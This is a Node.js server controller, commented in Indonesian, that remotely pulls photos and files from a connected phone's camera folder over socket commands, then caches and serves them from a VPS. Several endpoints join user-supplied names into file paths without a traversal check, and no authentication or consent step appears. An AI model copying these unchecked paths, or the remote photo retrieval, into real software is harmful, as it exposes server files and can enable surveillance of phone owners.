const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const db = require('../db');
const socketModule = require('../socket');
const pendingDownloads = require('../utils/pendingDownloads');

// 1. GET /api/files - Menyeleksi berkas dari cache JSON lokal VPS (select & filter tgl)
async function getFiles(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { date, deviceId } = req.query;

  // Resolve deviceId
  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  let files = [];
  try {
    // Baca all.json
    const allFilePath = path.join(targetDir, 'all.json');
    if (fs.existsSync(allFilePath)) {
      files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    }

    // Jika filter tanggal dikirim, saring secara in-memory
    if (date) {
      files = files.filter(file => {
        if (!file.mtime) return false;
        try {
          const d = new Date(file.mtime);
          if (isNaN(d.getTime())) return false;
          const isoDate = d.toISOString().split('T')[0];
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          const localDateStr = `${localYear}-${localMonth}-${localDay}`;
          return isoDate === date || localDateStr === date;
        } catch (e) {
          return false;
        }
      });
    }

    // Urutkan mtime descending
    files.sort((a, b) => {
      const timeA = a.mtime ? new Date(a.mtime).getTime() : 0;
      const timeB = b.mtime ? new Date(b.mtime).getTime() : 0;
      return timeB - timeA;
    });

    res.json(files);
  } catch (err) {
    res.status(500).json({ error: 'Gagal memuat berkas cache dari VPS.', details: err.message });
  }
}

// 2. GET /api/files/get - Membaca metadata berkas spesifik dari cache JSON lokal VPS
async function getFileMetadata(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const foundFile = files.find(f => f.name === name);

    if (!foundFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan di dalam cache.` });
    }

    res.json(foundFile);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca metadata berkas dari cache.', details: err.message });
  }
}

// 3. GET /api/files/preview - Inisiasi request preview berkas dari HP menggunakan jalur path cache
async function previewFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;
    const fileExtension = path.extname(name).toLowerCase();

    // 1. Format nama folder berdasarkan mtime
    const mtime = targetFile.mtime || targetFile.fileMtime;
    let dateStr = 'no-date';
    if (mtime) {
      try {
        const d = new Date(mtime);
        if (!isNaN(d.getTime())) {
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          dateStr = `${localYear}-${localMonth}-${localDay}`;
        }
      } catch (e) {}
    } else {
      // Fallback ke tanggal saat ini
      const d = new Date();
      const localYear = d.getFullYear();
      const localMonth = String(d.getMonth() + 1).padStart(2, '0');
      const localDay = String(d.getDate()).padStart(2, '0');
      dateStr = `${localYear}-${localMonth}-${localDay}`;
    }

    // 2. Pastikan folder mtime ada
    const dateDir = path.join(targetDir, dateStr);
    if (!fs.existsSync(dateDir)) {
      fs.mkdirSync(dateDir, { recursive: true });
    }

    // 3. Tentukan nama berkas hasil preview (jika bukan ekstensi gambar, simpan sebagai .jpg)
    const isImgExt = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.heic', '.bmp'].includes(fileExtension);
    let previewFileName = name;
    if (!isImgExt) {
      previewFileName = `${name}.jpg`;
    }
    const targetDiskPath = path.join(dateDir, previewFileName);

    let contentType = 'image/jpeg';
    if (fileExtension === '.png') contentType = 'image/png';
    else if (fileExtension === '.gif') contentType = 'image/gif';
    else if (fileExtension === '.webp') contentType = 'image/webp';

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`👁️  Meminta preview berkas dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);
    console.log(`💾 Preview akan disimpan di VPS: ${targetDiskPath}`);

    res.setHeader('Content-Disposition', 'inline');
    res.setHeader('Content-Type', contentType);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Preview session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak mengirimkan preview.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    // Set saveToDisk dan targetDiskPath agar sekaligus menyimpan file hasil stream ke VPS disk
    pendingDownloads.set(downloadSessionId, { 
      res, 
      timer, 
      fileName: name, 
      saveToDisk: true, 
      targetDiskPath, 
      isStreamResponse: true 
    });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_PREVIEW', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'PREVIEW_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengambil preview: ${err.message}`);
  }
}

// 4. GET /api/files/download - Inisiasi request download berkas penuh dari HP menggunakan jalur path cache
async function downloadFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;

    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
    res.setHeader('Content-Type', 'application/octet-stream');

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`📥 Meminta download berkas penuh dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Download session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak merespon.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    pendingDownloads.set(downloadSessionId, { res, timer, fileName: name });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_FILE', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'DOWNLOAD_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengunduh berkas: ${err.message}`);
  }
}

// 5. GET /api/files/json-list - Menampilkan daftar file JSON cache yang tersimpan di VPS
async function getJsonList(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId } = req.query;

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  try {
    const fileNames = fs.readdirSync(targetDir)
      .filter(name => name.endsWith('.json'))
      .sort((a, b) => b.localeCompare(a)); // Urutkan nama (tanggal) descending
    res.json(fileNames);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca daftar JSON cache.', details: err.message });
  }
}

// 6. GET /api/files/json-get - Membaca isi berkas JSON cache spesifik di VPS
async function getJsonContent(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { name, deviceId } = req.query;

  if (!name) {
    return res.status(400).json({ error: 'Parameter "name" (nama file JSON) diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
  const filePath = path.join(targetDir, name.endsWith('.json') ? name : `${name}.json`);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: `Berkas JSON cache "${name}" tidak ditemukan di VPS.` });
  }

  try {
    const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    res.json(content);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca berkas JSON cache.', details: err.message });
  }
}

// 7. GET /api/vps/files - Menampilkan daftar berkas fisik terkompresi yang tersimpan di VPS
async function getVpsFiles(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId } = req.query;

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  try {
    const list = [];
    const items = fs.readdirSync(targetDir);
    for (const item of items) {
      const itemPath = path.join(targetDir, item);
      const stat = fs.statSync(itemPath);
      if (stat.isDirectory()) {
        const files = fs.readdirSync(itemPath);
        for (const filename of files) {
          const filePath = path.join(itemPath, filename);
          const fileStat = fs.statSync(filePath);
          if (fileStat.isFile()) {
            list.push({
              name: filename,
              date: item, // e.g. "2026-01-26"
              size: fileStat.size,
              mtime: fileStat.mtime,
              relativePath: `${item}/${filename}`
            });
          }
        }
      }
    }

    // Urutkan berdasarkan waktu modifikasi (mtime) descending (terbaru paling atas)
    list.sort((a, b) => new Date(b.mtime) - new Date(a.mtime));

    res.json(list);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca berkas di VPS.', details: err.message });
  }
}

// 8. GET /api/vps/files/download - Mengunduh berkas fisik terkompresi langsung dari VPS disk
function downloadVpsFile(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId, date, name } = req.query;

  if (!date || !name) {
    return res.status(400).json({ error: 'Parameter "date" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const filePath = path.resolve(uploadDir, `${activeDeviceId}-${folder}`, date, name);

  // Pencegahan directory traversal attack
  if (!filePath.startsWith(path.resolve(uploadDir))) {
    return res.status(403).json({ error: 'Akses tidak diperbolehkan.' });
  }

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Berkas tidak ditemukan di VPS.' });
  }

  const inline = req.query.inline === 'true';
  if (!inline) {
    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
  } else {
    res.setHeader('Content-Disposition', 'inline');
  }

  res.sendFile(filePath);
}

module.exports = {
  getFiles,
  getFileMetadata,
  previewFileCached,
  downloadFileCached,
  getJsonList,
  getJsonContent,
  getVpsFiles,
  downloadVpsFile
};
